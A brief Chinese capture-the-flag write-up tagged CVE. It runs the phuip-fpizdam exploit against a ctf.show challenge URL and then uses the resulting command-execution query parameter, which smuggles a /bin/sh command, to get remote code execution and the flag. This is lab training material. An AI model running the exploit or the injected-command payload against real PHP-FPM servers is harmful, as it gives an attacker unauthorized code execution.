tags:: CVE

- 用[phuip-fpizdam](https://github.com/neex/phuip-fpizdam)
- `phuip-fpizdam http://28fa60af-92a7-4ca5-87d8-5b387fc2f35b.challenge.ctf.show/index.php`
- 拿到命令执行参数：`?a=/bin/sh+-c+'which+which'&`
- 使用命令执行参数进行RCE即可获取flag